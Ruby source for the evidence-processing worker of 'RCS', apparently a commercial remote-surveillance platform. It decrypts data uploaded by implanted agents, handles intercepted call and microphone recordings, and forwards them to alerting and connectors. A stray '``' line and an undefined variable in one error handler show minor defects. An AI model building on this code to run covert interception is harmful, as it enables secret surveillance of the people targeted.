# from RCS::Common
require 'rcs-common/trace'
require 'rcs-common/evidence'

if File.directory?(Dir.pwd + '/lib/rcs-worker-release')
  require 'rcs-db-release/config'
  require 'rcs-db-release/db_layer'
  require 'rcs-db-release/grid'
  require 'rcs-db-release/alert'
  require 'rcs-db-release/connectors'
else
  require 'rcs-db/config'
  require 'rcs-db/db_layer'
  require 'rcs-db/grid'
  require 'rcs-db/alert'
  require 'rcs-db/connectors'
end

require_relative 'call_processor'
require_relative 'mic_processor'
require_relative 'single_processor'

require 'mongo'
require 'openssl'
require 'digest/sha1'
require 'thread'

# specific evidence processors
Dir[File.dirname(__FILE__) + '/evidence/*.rb'].each do |file|
  require file
end

module RCS
module Worker

class InvalidAgentTarget < StandardError
  attr_reader :msg

  def initialize(msg)
    @msg = msg
  end

  def to_s
    @msg
  end
end

class InstanceWorker
  include RCS::Tracer

  SLEEP_TIME = 30
  RESUME_TIME = 10

  def get_agent_target
    @agent = Item.agents.where({ident: @ident, instance: @instance, status: 'open'}).first
    raise InvalidAgentTarget.new("Agent \'#{@ident}:#{@instance}\' cannot be found.") if @agent.nil?
    @target = @agent.get_parent
    trace :debug, "GET_AGENT_TARGET agent: #{@agent['name']} target: #{@target['name']}"
  end

  def initialize(instance, ident)
    @instance = instance
    @ident = ident
    @evidences = []
    @state = :running
    @seconds_sleeping = 0
    @semaphore = Mutex.new

    # get info about the agent instance from evidence db
    # if agent/target is not found, delete all the evidences (cannot be inserted anyway)
    begin
      get_agent_target
    rescue InvalidAgentTarget => e
      trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
      RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
      return
    end

    trace :info, "Created processor for agent #{ident}:#{instance} (target #{@target['_id']})"

    # the log key is passed as a string taken from the db
    # we need to calculate the MD5 and use it in binary form
    @key = Digest::MD5.digest @agent['logkey']

    @process = Proc.new do
      resume

      until sleeping_too_much?
        until @evidences.empty?
          resume
          raw_id = BSON::ObjectId(@evidences.shift)

          trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] still #{@evidences.size} evidences to go ..."

          begin
            start_time = Time.now

            # get binary evidence
            data = RCS::DB::GridFS.get(raw_id, "evidence")
            next if data.nil?

            raw = data.read

            # deserialize binary evidence and forward decoded
            decoded_data = ''
            evidences, action = begin
              RCS::Evidence.new(@key).deserialize(raw) do |data|
                decoded_data += data unless data.nil?
              end
            rescue EmptyEvidenceError => e
              trace :info, "[#{raw_id}:#{@ident}:#{@instance}] deleting empty evidence #{raw_id}"
              RCS::DB::GridFS.delete(raw_id, "evidence")
              next
            rescue EvidenceDeserializeError => e
              trace :warn, "[#{raw_id}:#{@ident}:#{@instance}] decoding failed for #{raw_id}: #{e.to_s}, deleting..."
              RCS::DB::GridFS.delete(raw_id, "evidence")

              Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
              path = "decoding_failed/#{evidence_id}.dec"
              f = File.open(path, 'wb') {|f| f.write decoded_data}
              trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
              next
            end

            # if evidences is nil, emulate there's no evidence, delete raw
            if evidences.nil?
              evidences = Array.new
              action = :delete_raw
            end

            ev_type = ''
 ``
            evidences.each do |ev|

              next if ev.empty?

              # store agent instance in evidence (used when storing into db)
              ev[:instance] ||= @agent['instance']
              ev[:ident] ||= @agent['ident']

              # find correct processing module and extend evidence
              mod = "#{ev[:type].to_s.capitalize}Processing"
              if RCS.const_defined? mod.to_sym
                ev.extend eval(mod)
              else
                ev.extend DefaultProcessing
              end

              ev.process if ev.respond_to? :process

              trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] processing evidence of type #{ev[:type]} (#{raw.bytesize} bytes)"

              # get info about the agent instance from evidence db
              begin
                get_agent_target

                processor = case ev[:type]
                              when 'call'
                                @call_processor ||= CallProcessor.new
                                @call_processor
                              when 'mic'
                                @mic_processor ||= MicProcessor.new
                                @mic_processor
                              else
                                @single_processor ||= SingleProcessor.new
                                @single_processor
                            end

                # override original type
                ev[:type] = ev.type if ev.respond_to? :type
                ev_type = ev[:type]

                evidence_id, index = processor.feed(ev, @agent, @target) do |evidence|
                  # check if there are matching alerts for this evidence
                  RCS::DB::Alerting.new_evidence(evidence) unless evidence.nil?

                  trace :debug, "FORWARDING #{evidence.type}"

                  # forward the evidence to connectors (if any)
                  RCS::DB::Connectors.new_evidence(evidence) unless evidence.nil?
                end

              rescue InvalidAgentTarget => e
                trace :error, "Cannot find agent #{ident}:#{instance}, deleting all related evidence."
                RCS::DB::GridFS.delete_by_filename("#{ident}:#{instance}", "evidence")
                return
              rescue Exception => e
                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot store evidence, #{e.message}"
                trace :error, "[#{raw_id}:#{@ident}:#{@instance}] #{e.backtrace}"
              end
            end

            processing_time = Time.now - start_time
            trace :info, "[#{raw_id}] processed #{ev_type.upcase} for agent #{@agent['name']} in #{processing_time} sec"

          rescue Mongo::ConnectionFailure => e
            trace :error, "[#{raw_id}:#{@ident}:#{@instance}] cannot connect to database, retrying in 5 seconds ..."
            sleep 5
            retry
          rescue Exception => e
            trace :fatal, "[#{raw_id}:#{@ident}:#{@instance}] Unrecoverable error processing evidence #{raw_id}: #{e.message}"
            trace :debug, "[#{raw_id}:#{@ident}:#{@instance}] EXCEPTION: " + e.backtrace.join("\n")

            Dir.mkdir "decoding_failed" unless File.exists? "decoding_failed"
            path = "decoding_failed/#{raw_id}.dec"
            f = File.open(path, 'wb') {|f| f.write decoded_data}
            trace :debug, "[#{raw_id}] forwarded undecoded evidence #{raw_id} to #{path}"
          end

          # forward raw evidence
          #RCS::DB::Connectors.new_raw(raw_id, index, @agent, evidence_id) unless evidence_id.nil?

          # delete raw evidence
          RCS::DB::GridFS.delete(raw_id, "evidence")
          trace :debug, "deleted raw evidence #{raw_id}"

        end
        take_some_rest
      end

      put_to_sleep
    end

    EM.defer @process
  end

  def resume
    @state = :running
    @seconds_sleeping = 0
    trace :debug, "[#{@agent['ident']}:#{@agent['instance']}] #{@evidences.size} evidences in queue for processing."
  end
  
  def take_some_rest
    #resume_pending if @seconds_sleeping % RESUME_TIME == 0
    sleep 1
    @seconds_sleeping += 1
  end
  
  def put_to_sleep
    @state = :stopped
    trace :debug, "processor #{@agent['ident']}:#{@agent['instance']} is sleeping too much, let's stop!"
  end
  
  def stopped?
    @state == :stopped
  end

  def forwarding?
    RCS::DB::Config.instance.global['FORWARD'] == true
  end
  
  def sleeping_too_much?
    @seconds_sleeping >= SLEEP_TIME
  end

  def queue(id)
    @evidences << id unless id.nil?

    @semaphore.synchronize do
      if stopped?
        trace :debug, "deferring work for #{@agent['ident']}:#{@agent['instance']}"
        EM.defer @process
      end
    end
  end

  def resume_pending
    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] resuming pending evidences."
    db = Mongoid.database
    evidences = db.collection('grid.evidence.files').find({filename: "#{@ident}:#{@instance}", metadata: {shard: RCS::DB::Config.instance.global['SHARD']}}, {sort: ["_id", :asc]})
    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] no resumable evidences to process." if @evidences.empty?
    evidences.each do |ev|
      ident, instance = ev['filename'].split(":")

      # resume pending evidence
      QueueManager.instance.queue instance, ident, ev['_id'].to_s
    end

    trace :info, "[#{@agent['ident']}:#{@agent['instance']}] done resuming."
  rescue Exception => e
    trace :error, "[#{e.class}] #{e.message}"
  end

  def to_s
    "#{@agent['ident']}:#{@agent['instance']}: #{@evidences.size}"
  end
end

end # ::Worker
end # ::RCS
